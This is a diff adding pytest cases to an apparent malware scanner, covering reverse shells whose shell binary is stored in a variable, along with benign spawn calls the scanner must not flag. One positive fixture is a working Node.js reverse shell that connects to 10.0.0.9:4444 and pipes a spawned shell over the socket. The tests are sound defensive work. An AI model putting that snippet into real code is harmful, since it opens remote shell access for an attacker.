@@ -2365,3 +2365,48 @@ def test_wallet_vocabulary_still_escalates_process_execution(capability):
 def test_other_context_signals_still_escalate_dynamic_code():
     hits = [("a.js", "shell process spawned"), ("a.js", "eval() - dynamic code execution")]
     assert corroborated_capabilities(hits) == ["eval() - dynamic code execution"]
+
+
+# ---------------------------------------------------------------------------
+# F44 — a reverse shell whose binary is a variable
+#
+# The no-command arm needed the shell as a string literal, so
+# `const bin = process.env.SHELL; spawn(bin, [])` matched nothing. Read as a
+# small dataflow step: a name assigned a shell literal or a shell-valued env
+# var, then spawned bare within a short window. `spawn(cmd, args)` over opaque
+# locals stays silent — it is the commonest shape in build tooling.
+# ---------------------------------------------------------------------------
+
+
+@pytest.mark.parametrize(
+    "code",
+    [
+        "const bin = process.env.SHELL;\nconst sh = spawn(bin, []);",
+        "const bin = process.env.SHELL || '/bin/sh';\nspawn(bin);",
+        "var s = '/bin/sh';\nrequire('child_process').spawnSync(s, [], {stdio: 'pipe'});",
+        "let c = process.env['ComSpec'];\nexec(c);",
+        "spawn(process.env.ComSpec, [], { stdio: 'pipe' });",
+        "const bin = process.env.SHELL;\n"
+        "const net = require('net');\n"
+        "const sh = spawn(bin, []);\n"
+        "net.connect(4444, '10.0.0.9', function () { this.pipe(sh.stdin); sh.stdout.pipe(this); });",
+    ],
+)
+def test_a_shell_held_in_a_variable_is_reported_when_spawned_bare(code):
+    assert SHELL_DESCRIPTION in scan_text_for_malware_patterns(code), code
+
+
+@pytest.mark.parametrize(
+    "code",
+    [
+        "spawn(cmd, args, opts);",
+        "const bin = resolveBinary(name);\nspawn(bin, []);",
+        "const sh = process.env.SHELL;\nspawn(sh, ['-c', script]);",
+        "const sh = process.env.SHELL;\nspawn(other, []);",
+        "if (shell == '/bin/sh') spawn(shell, []);",
+        "const shell2 = process.env.SHELL;\nspawn(shell, []);",
+        "const cmd = 'npm';\nspawn(cmd, []);",
+    ],
+)
+def test_an_opaque_or_commanded_variable_spawn_is_not_reported(code):
+    assert SHELL_DESCRIPTION not in scan_text_for_malware_patterns(code), code
